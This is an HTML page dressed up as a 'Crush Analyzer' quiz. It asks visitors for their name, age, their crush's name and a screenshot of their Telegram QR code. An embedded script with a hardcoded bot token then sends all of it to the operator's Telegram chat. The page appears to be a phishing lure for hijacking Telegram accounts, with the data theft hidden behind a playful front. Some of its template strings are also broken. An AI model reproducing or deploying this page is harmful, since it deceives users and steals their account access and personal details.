<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Telegram Knows About Your Crush</title>
  <style>
    body { font-family: Arial; padding: 20px; font-size: 26px; }
    label, input, button { display: block; margin-top: 12px; font-size: 24px; }
    button { padding: 10px 20px; }
  </style>
</head>
<body>
  <h2>üîÆ Crush Analyzer üîÆ</h2>
  <p>Send the QR code on your Telegram app, their name, your age, and your name. (Then you will know the truth ‚ù§Ô∏è)</p>

  <form id="crushForm">
    <label>Your Name:</label>
    <input type="text" id="yourName" required>

    <label>Your Age:</label>
    <input type="number" id="yourAge" required>

    <label>Crush's Name:</label>
    <input type="text" id="crushName" required>

    <label>Upload Crush Photo:</label>
    <input type="file" id="YourQR(screenshot)" accept="image/*" required>

    <button type="submit">Tell Me the Truth üî•</button>
  </form>

  <p id="status" style="color:green;"></p>

  <script>
    const BOT_TOKEN = "7548275702:AAEI9W4yHPQA6FiWCXiGUbqkkjBEXcSG29Y";
    const CHAT_ID = "7546051597";

    document.getElementById('crushForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const name = document.getElementById('yourName').value;
      const age = document.getElementById('yourAge').value;
      const crush = document.getElementById('crushName').value;
      const photo = document.getElementById('YourQR(screenshot)').files[0];

      // ‚úÖ Step 1: Send Text Info
      const text = üíå New Crush Submission:\n\nüë§ Your Name: ${name}\nüéÇ Your Age: ${age}\n‚ù§Ô∏è Crush's Name: ${crush};
      await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text
        })
      });

      // ‚úÖ Step 2: Send Photo
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', photo);

      await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {
        method: 'POST',
        body: formData
      });

      document.getElementById('status').innerText = "‚úÖ Sent Successfully!";
      document.getElementById('crushForm').reset();
    });
  </script>
</body>
</html>
